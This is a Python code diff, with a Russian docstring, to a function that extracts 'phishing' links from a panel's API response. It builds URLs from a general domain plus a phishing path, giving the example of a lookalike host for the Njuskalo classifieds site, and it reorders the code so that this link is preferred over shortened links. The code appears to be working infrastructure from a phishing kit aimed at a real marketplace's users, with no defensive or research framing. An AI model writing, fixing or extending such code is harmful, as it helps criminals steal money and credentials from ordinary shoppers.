@@ -97,6 +97,11 @@ def _image_mime(url: str) -> str:
 
 
 def extract_rpc_link(data: dict[str, Any], *, method: str = "2_0") -> str:
+    """Ссылка для клиента: domains.general + phishing path (njuskalo.ictiesor.com/a/…).
+
+    short_links — укороченный общий хост без префикса площадки; его берём только если
+    general+path нет (как в кабинете RPC).
+    """
     if not isinstance(data, dict):
         raise RpcError(f"Bad response: {data!r}")
     status = data.get("status")
@@ -104,23 +109,6 @@ def extract_rpc_link(data: dict[str, Any], *, method: str = "2_0") -> str:
         raise RpcError(str(data.get("error") or data.get("message") or data)[:400])
     block = data.get("data") if isinstance(data.get("data"), dict) else data
     want = (method or "2_0").strip() or "2_0"
-    shorts = block.get("short_links")
-    if isinstance(shorts, list):
-        chosen: list[str] = []
-        for row in shorts:
-            if not isinstance(row, dict):
-                continue
-            m = str(row.get("method") or "").strip()
-            url = (
-                str(row.get("private") or "").strip()
-                or str(row.get("public") or "").strip()
-            )
-            if url.lower().startswith(("http://", "https://")):
-                if m == want or (not m and want == "2_0"):
-                    return url
-                chosen.append(url)
-        if chosen:
-            return chosen[0]
     paths = block.get("paths") if isinstance(block.get("paths"), dict) else {}
     domains = block.get("domains") if isinstance(block.get("domains"), dict) else {}
     phishing = paths.get("phishing") if isinstance(paths.get("phishing"), dict) else {}
@@ -133,12 +121,29 @@ def extract_rpc_link(data: dict[str, Any], *, method: str = "2_0") -> str:
         or ""
     )
     path = str(path or "").strip()
-    host = str(domains.get("general") or domains.get("custom") or domains.get("short") or "").strip()
+    host = str(domains.get("general") or domains.get("custom") or "").strip()
     host = host.replace("https://", "").replace("http://", "").split("/")[0]
     if host and path:
         if not path.startswith("/"):
             path = "/" + path
         return f"https://{host}{path}"
+    shorts = block.get("short_links")
+    if isinstance(shorts, list):
+        chosen: list[str] = []
+        for row in shorts:
+            if not isinstance(row, dict):
+                continue
+            m = str(row.get("method") or "").strip()
+            url = (
+                str(row.get("public") or "").strip()
+                or str(row.get("private") or "").strip()
+            )
+            if url.lower().startswith(("http://", "https://")):
+                if m == want or (not m and want == "2_0"):
+                    return url
+                chosen.append(url)
+        if chosen:
+            return chosen[0]
     tag = str(block.get("tag") or "").strip()
     short_host = str(domains.get("short") or "").strip()
     short_host = short_host.replace("https://", "").replace("http://", "").split("/")[0]
